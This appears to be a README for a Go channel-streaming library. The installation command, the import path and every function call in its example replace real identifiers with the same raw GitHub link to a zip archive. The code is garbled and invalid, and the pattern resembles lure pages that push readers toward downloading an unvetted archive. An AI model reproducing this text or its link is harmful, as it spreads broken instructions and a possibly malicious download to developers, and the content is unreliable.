## Introduction

In modern software development, handling data streams efficiently is essential. Go ChanStreaming provides a simple and effective way to build concurrent data processing and streaming pipelines using channels. With this library, you can harness the power of Go’s concurrency model while keeping your code clean and readable.

## Features

- **Concurrency**: Utilize Go’s goroutines and channels for parallel data processing.
- **Lightweight**: Designed to be minimalistic without sacrificing performance.
- **Flexible**: Supports various data types and processing patterns.
- **Easy to use**: Simple API for quick integration into your projects.

## Getting Started

### Installation

To get started with Go ChanStreaming, you need to install the library. You can do this by running:

```bash
go get https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip
```

### Usage

Here’s a quick example to show how to use Go ChanStreaming in your project. 

```go
package main

import (
    "fmt"
    "https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip"
)

func main() {
    // Initialize your stream
    stream := https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip()

    // Add data to the stream
    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip("Hello, World!")
    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip("Go is awesome!")

    // Process the data
    https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip(func(data string) {
        https://github.com/mithun644/go-chanstreaming/raw/refs/heads/main/pkg/chanstreaming/go-chanstreaming-v1.0.zip(data)
    })
}
```
